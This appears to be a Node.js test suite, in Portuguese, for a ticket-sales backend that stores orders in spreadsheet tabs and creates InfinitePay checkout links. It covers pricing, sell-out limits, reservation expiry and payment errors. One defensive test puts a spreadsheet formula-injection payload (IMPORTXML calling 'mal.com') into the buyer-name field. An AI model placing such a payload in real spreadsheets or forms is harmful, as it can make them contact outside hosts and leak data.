import { test, describe } from 'node:test';
import assert from 'node:assert/strict';
import { criarAmbiente, COMPRADOR_VALIDO } from './ambiente-gas.js';

/** Preenche a aba de ingressos com N ingressos "de mentira". */
function ocuparVagas(amb, n) {
  const aba = amb.abaIngressos();
  for (let i = 0; i < n; i++) {
    aba.appendRow(['', "'Convidado " + i, "'CORT" + String(i).padStart(4, '0'), '', "'Pendente"]);
  }
}

describe('criar_pedido', () => {
  test('cria o pedido, reserva e devolve o link da InfinitePay', () => {
    const amb = criarAmbiente();
    const r = amb.post(COMPRADOR_VALIDO);

    assert.equal(r.sucesso, true, JSON.stringify(r));
    assert.match(r.dados.orderNsu, /^NDH-[A-Z0-9]{12}$/);
    assert.equal(r.dados.urlPagamento, 'https://checkout.infinitepay.io/teste?lenc=abc');

    const linha = amb.abaPedidos().linha(2);
    assert.equal(linha[0], r.dados.orderNsu);
    assert.equal(linha[2], 'AGUARDANDO_PAGAMENTO');
    assert.equal(linha[5], '529.982.247-25');
    assert.equal(linha[8], 100, 'valor em centavos');
    assert.match(String(linha[9]), /^[0-9a-f]{32}$/, 'token');
    assert.equal(linha[10], r.dados.urlPagamento);
  });

  test('manda pra InfinitePay o preço em centavos e as URLs certas', () => {
    const amb = criarAmbiente();
    amb.post({ ...COMPRADOR_VALIDO, quantidade: 2 });

    const { url, corpo } = amb.requisicoes[0];
    assert.equal(url, 'https://api.checkout.infinitepay.io/links');
    assert.equal(corpo.handle, amb.CONFIG.INFINITEPAY.HANDLE);
    assert.deepEqual(corpo.items, [{
      quantity: 2,
      price: amb.CONFIG.PRECO_CENTAVOS,
      description: amb.CONFIG.EVENTO.DESCRICAO_ITEM,
    }]);
    assert.equal(corpo.redirect_url, amb.CONFIG.URL_SITE + 'ingresso/');
    assert.equal(corpo.webhook_url, amb.CONFIG.URL_WEBHOOK);
    assert.equal(corpo.customer.phone_number, '+5511987654321');
  });

  test('não confia em preço enviado pelo navegador', () => {
    const amb = criarAmbiente();
    amb.post({ ...COMPRADOR_VALIDO, preco: 1, valor: 1, price: 1 });
    assert.equal(amb.requisicoes[0].corpo.items[0].price, amb.CONFIG.PRECO_CENTAVOS);
  });

  test('recusa dados inválidos sem chamar a InfinitePay', () => {
    const amb = criarAmbiente();
    const r = amb.post({ ...COMPRADOR_VALIDO, cpf: '000.000.000-00' });
    assert.equal(r.sucesso, false);
    assert.equal(r.codigo, 'DADOS_INVALIDOS');
    assert.equal(amb.requisicoes.length, 0);
  });

  test('bloqueia injeção de fórmula no nome', () => {
    const amb = criarAmbiente();
    const r = amb.post({ ...COMPRADOR_VALIDO, nome: '=IMPORTXML("http://mal.com", "//a") x' });
    assert.equal(r.sucesso, true);
    const aba = amb.abaPedidos();
    assert.equal(aba.formula(2, 4), null, 'nome não pode virar fórmula');
    assert.equal(aba.ler(2, 4), '=IMPORTXML("http://mal.com", "//a") x');
  });

  test('esgotado: não vende além da capacidade', () => {
    const amb = criarAmbiente();
    ocuparVagas(amb, amb.CONFIG.CAPACIDADE - 1);

    const dois = amb.post({ ...COMPRADOR_VALIDO, quantidade: 2 });
    assert.equal(dois.sucesso, false);
    assert.equal(dois.codigo, 'ESGOTADO');
    assert.equal(dois.erro, 'Só resta 1 ingresso.');

    assert.equal(amb.post(COMPRADOR_VALIDO).sucesso, true);

    const depois = amb.post(COMPRADOR_VALIDO);
    assert.equal(depois.codigo, 'ESGOTADO');
    assert.equal(depois.erro, 'Ingressos esgotados.');
  });

  test('pedido aguardando pagamento segura a vaga; depois do prazo libera', () => {
    const amb = criarAmbiente();
    ocuparVagas(amb, amb.CONFIG.CAPACIDADE - 1);

    assert.equal(amb.post(COMPRADOR_VALIDO).sucesso, true);
    assert.equal(amb.get().dados.vagas, 0);

    // Volta o relógio do pedido pra além da janela de reserva.
    const minutos = amb.CONFIG.RESERVA_MINUTOS + 1;
    amb.abaPedidos().escrever(2, 2, new Date(Date.now() - minutos * 60000));
    assert.equal(amb.get().dados.vagas, 1);
  });

  test('ingresso cancelado não conta na lotação', () => {
    const amb = criarAmbiente();
    ocuparVagas(amb, amb.CONFIG.CAPACIDADE);
    assert.equal(amb.get().dados.vagas, 0);
    amb.abaIngressos().escrever(2, 5, 'Cancelado');
    assert.equal(amb.get().dados.vagas, 1);
  });

  test('se a InfinitePay falha, o pedido é marcado e a reserva liberada', () => {
    const amb = criarAmbiente();
    amb.infinitePay.criarLink = () => ({ status: 500, corpo: 'Internal Server Error' });

    const r = amb.post(COMPRADOR_VALIDO);
    assert.equal(r.sucesso, false);
    assert.equal(r.codigo, 'PAGAMENTO_INDISPONIVEL');
    assert.equal(amb.abaPedidos().ler(2, 3), 'ERRO_AO_GERAR_PAGAMENTO');
    assert.equal(amb.get().dados.vagas, amb.CONFIG.CAPACIDADE);
    assert.equal(amb.trava.presa, false, 'trava precisa ser liberada mesmo com erro');
  });

  test('erro de rede na InfinitePay vira mensagem amigável', () => {
    const amb = criarAmbiente();
    amb.infinitePay.criarLink = () => new Error('DNS error');
    const r = amb.post(COMPRADOR_VALIDO);
    assert.equal(r.codigo, 'PAGAMENTO_INDISPONIVEL');
    assert.doesNotMatch(r.erro, /DNS/);
  });

  test('InfinitePay responde 200 sem url', () => {
    const amb = criarAmbiente();
    amb.infinitePay.criarLink = () => ({ status: 200, corpo: { erro: 'handle inválido' } });
    assert.equal(amb.post(COMPRADOR_VALIDO).codigo, 'PAGAMENTO_INDISPONIVEL');
  });

  test('sistema ocupado (trava não obtida) responde erro claro', () => {
    const amb = criarAmbiente();
    amb.trava.recusar = true;
    const r = amb.post(COMPRADOR_VALIDO);
    assert.equal(r.codigo, 'OCUPADO');
  });
});
